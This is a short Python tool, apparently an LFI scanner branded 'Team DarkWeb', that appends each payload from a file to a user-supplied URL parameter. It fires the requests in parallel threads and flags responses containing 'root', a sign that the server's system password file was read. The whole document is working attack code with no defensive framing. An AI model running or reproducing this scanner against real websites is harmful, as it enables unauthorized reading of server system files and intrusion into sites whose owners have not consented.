#!/usr/bin/python 
import os
import requests as nabil 
import concurrent.futures 

logo = """ \033[1;94m
    _   __    _       ____________
   / | / /   | |     / / ____/ __ )
  /  |/ /____| | /| / / __/ / __  |
 / /|  /_____/ |/ |/ / /___/ /_/ /
/_/ |_/      |__/|__/_____/_____/

Created By : \033[1;96mNabil-Rahman |\033[1;0m [V 1.2.2]

\033[1;32m------------------------------------------   
\33[93m AUTHOR  : Team DarkWeb -TD
\33[93m GITHUB  : github.com/Nabil-Official
\33[93m FB      : nabil.404
\033[1;32m------------------------------------------   
"""
os.system('clear')
print(logo)

url = str(input("\033[1;31m>> \033[1;32mEnter Url With Param : \033[1;36m"))
print("")
if "?" in url:
	url = url 
	o = open("lfi-pay.txt","r").readlines()
else:
	print(f"\033[1;31m[!] ERROR : \033[1;32mEnter url with paramater !")
	exit()

def scan(x):
	pay = x.strip()
	url_p = url+pay 
	req = nabil.get(url_p).text 
	if "root" in req:
		print(f"\033[1;32m[+] FOUND     : {url_p}")
	else:
		print(f"\033[1;31m[!] NOT FOUND : {url_p}")
with concurrent.futures.ThreadPoolExecutor() as exe:
	exe.map(scan,o)